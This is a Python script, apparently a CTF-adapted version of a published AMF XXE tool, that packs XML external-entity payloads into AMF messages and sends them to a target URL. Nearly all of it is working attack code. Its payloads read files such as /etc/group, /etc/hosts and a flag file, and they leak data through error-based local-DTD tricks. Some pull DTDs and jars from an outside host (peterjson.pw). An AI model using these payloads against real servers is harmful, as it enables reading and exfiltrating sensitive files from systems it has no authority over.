#!/usr/bin/python

# AMF XXE tool
# by Nicolas Gregoire / @Agarri_FR

import string, struct, sys, re
import requests

###########
# Helpers #
###########

proxy = {
	"http": "http://127.0.0.1:8888",
	"https" : "http://127.0.0.1:8888", 
}

def usage():

	# Build a string containing the payload names
	keys = get_payloads().keys()
	keys.sort()
	names = ', '.join(keys)
	
	# Print to user
	print "[!] Invalid arguments"
	print "- 1st arg: target URL"
	print "- 2nd arg: target service"
	print "- 3rd arg: payload name (%s)" % names
	print "[+] Example: %s http://0x0:8081/ echo %s" % (sys.argv[0], keys[0])
	sys.exit()

def send(url, body):

	# POST an AMF message
	ua = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:6.6.6) Gecko/20150401 Firefox/3.1.33.7'
	settings = { 'User-Agent': ua, 'Content-Type': 'application/x-amf' }
	print "[+] Sending the request..."
	try:
		r = requests.post(url, data=body, headers=settings, timeout=5,proxies=proxy)
		print('[+] Response code: %d' % r.status_code)
		# Clean the result before display
		clean = re.sub('[^ \r\n\t!-~]', '.', r.content)
		print('[+] Body:\n%s' % clean)
	except requests.exceptions.ConnectionError:
		print ('[!] Cannot connect to target...')
	except requests.exceptions.Timeout:
		print ('[!] Connection OK, but a timeout was reached...')

#############
# XML stuff #
#############

def get_payloads():

	xml = {}
	xml['static'] = '<x>Static content</x>'
	xml['internal'] = '<!DOCTYPE x [ <!ENTITY foo "Some text"> ]><x>Internal entity: &foo;</x>'
	xml['ext_group'] = '<!DOCTYPE x [ <!ENTITY foo SYSTEM "file:///etc/group"> ]><x>External entity 1: &foo;</x>'
	xml['ext_rand'] = '<!DOCTYPE x [ <!ENTITY foo SYSTEM "file:///dev/random"> ]><x>External entity 2: &foo;</x>'
	xml['ext_url'] = '<!DOCTYPE x [ <!ENTITY foo SYSTEM "http://127.0.0.1/"> ]><x>External entity 3: &foo;</x>'
	xml['prm_group'] = '<!DOCTYPE x [ <!ENTITY % foo SYSTEM "file:///etc/group"> %foo; ]><x>Parameter entity 1</x>'
	xml['prm_rand'] = '<!DOCTYPE x [ <!ENTITY % foo SYSTEM "file:///dev/random"> %foo; ]><x>Parameter entity 2</x>'


	xml['prm_url'] = '<!DOCTYPE x [ <!ENTITY % foo SYSTEM "http://127.0.0.1:8000/a.dtd"> %foo; ]><x>Parameter entity 3</x>'


	xml['ftp'] = '''<!DOCTYPE x [ <!ENTITY foo SYSTEM "ftp://peterjson.pw:12345/a.dtd"> ]><x>External entity 1: &foo;</x>'''

	xml['tetctf_v1'] = '''<!DOCTYPE message [
		<!ENTITY % local_dtd SYSTEM "jar:netdoc:///home/service/apache-tomcat-7.0.99/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
		<!ENTITY % URI '(aa) #IMPLIED>
			<!ENTITY &#x25; dude SYSTEM "netdoc:///home/service/flag.txt">
			<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;_:///peterjson/&#x25;dude;&#x27;>">
			&#x25;eval;
			&#x25;error;
			<!ATTLIST attxx aa "bb"'>	
		%local_dtd;
	]>
	<message></message>'''


	xml['etc_hosts'] = '''<!DOCTYPE message [
		<!ENTITY % local_dtd SYSTEM "jar:file:///home/service/apache-tomcat-7.0.99/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
		<!ENTITY % URI '(aa) #IMPLIED>
			<!ENTITY &#x25; file SYSTEM "file:///etc/hosts">
			<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///peterjson/&#x25;file;&#x27;>">
			&#x25;eval;
			&#x25;error;
			<!ATTLIST attxx aa "bb"'>
		%local_dtd;
	]>
	<message></message>'''

	xml['get_tmp_filename'] = '''<!DOCTYPE message [
		<!ENTITY % local_dtd SYSTEM "jar:file:///home/service/apache-tomcat-7.0.99/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
		<!ENTITY % URI '(aa) #IMPLIED>
			<!ENTITY &#x25; file SYSTEM "file:///home/service/apache-tomcat-7.0.99/temp/">
			<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///peterjson/&#x25;file;&#x27;>">
			&#x25;eval;
			&#x25;error;
			<!ATTLIST attxx aa "bb"'>
		%local_dtd;
	]>
	<message></message>'''


	xml['trigger_jar_xxe'] = '''<!DOCTYPE message [
		<!ENTITY % local_dtd SYSTEM "jar:http://peterjson.pw:9999/tar_symlink!/a.txt">
		<!ENTITY % URI '(aa) #IMPLIED>
			<!ENTITY &#x25; file SYSTEM "file:///">
			<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///peterjson/&#x25;file;&#x27;>">
			&#x25;eval;
			&#x25;error;
			<!ATTLIST attxx aa "bb"'>
		%local_dtd;
	]>
	<message></message>'''


	xml['dtd_group'] = '<!DOCTYPE x SYSTEM "file:///etc/group"><x>Remote DTD 1</x>'
	xml['dtd_rand'] = '<!DOCTYPE x SYSTEM "file:///dev/random"><x>Remote DTD 2</x>'
	xml['dtd_url'] = '<!DOCTYPE x SYSTEM "http://127.0.0.1:22/"><x>Remote DTD 3</x>'
	return xml

def get_payload(name):

	xml = get_payloads()
	try: 
		return xml[name]
	except KeyError:
		usage()

#############
# AMF stuff #
#############

def encode(string, xml=False):

	string = string.encode('utf-8')
	if xml:
		const = '\x0f' # AMF0 XML document
		size = struct.pack("!L", len(string)) # Size on 4 bytes
	else:
		const = '' # AMF0 URI
		size = struct.pack("!H", len(string)) # Size on 2 bytes
	return const + size + string

def build_amf_packet(svc, xml_str):

	# Message
	array_with_one_entry = '\x0a' + '\x00\x00\x00\x01' # AMF0 Array
	msg = array_with_one_entry + encode(xml_str, xml=True)
	
	# Body
	target_uri = encode(svc) # Target URI
	response_uri = encode('foobar') # Response URI
	sz_msg = struct.pack("!L", len(msg)) 
	body = target_uri + response_uri + sz_msg + msg

	# Packet
	version = '\x00\x03' # Version
	headers = '\x00\x00' # No headers
	bodies = '\x00\x01' + body # One body
	packet = version + headers + bodies

	return packet

#############
# Main code #
#############

# Parse arguments
if (len(sys.argv) != 4):
	usage()
target_url = sys.argv[1]
target_svc = sys.argv[2]
payload_name = sys.argv[3]
payload = get_payload(payload_name)

# Build AMF packet
amf_pkt = build_amf_packet(target_svc, payload)

# Display some info
print "[+] Target URL: '%s'" % target_url
print "[+] Target service: '%s'" % target_svc
# print "[+] Payload '%s': '%s'" % (payload_name, payload)

# Send to target
send(target_url, amf_pkt)
print('[+] Done')
